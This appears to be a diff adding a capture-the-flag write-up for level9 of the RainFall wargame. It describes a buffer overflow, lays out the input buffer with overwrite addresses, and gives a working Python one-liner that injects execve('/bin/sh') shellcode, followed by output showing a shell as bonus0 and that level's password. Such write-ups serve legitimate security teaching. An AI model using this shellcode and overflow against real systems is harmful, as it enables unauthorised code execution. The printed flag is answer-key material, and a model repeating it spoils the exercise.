@@ -1,0 +1,18 @@
+shell code injection like level 2
+we notice that when given a paramter with length > 108 the program crashes
+bytes[108:112] become address#2, address#1 will be address#2+4
+
+input buffer layout:
+    bytes[0:4]      :   address#1   (address#2 + 4)     ;0x0804a010
+    bytes[4:108]    :   good for shell code
+    bytes[108:112]  :   address#2                       ;0x0804a00c
+
+
+
+level9@RainFall:/tmp$ /home/user/level9/level9 $(python -c "sh='\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80'; print('\x08\x04\xa0\x10'[::-1] + sh + '\x90'*(112-8-len(sh)) + '\x08\x04\xa0\x0c'[::-1])")
+$ whoami
+bonus0
+$ cat /home/user/bonus0/.pass
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+$ 
+level9@RainFall:/tmp$ 
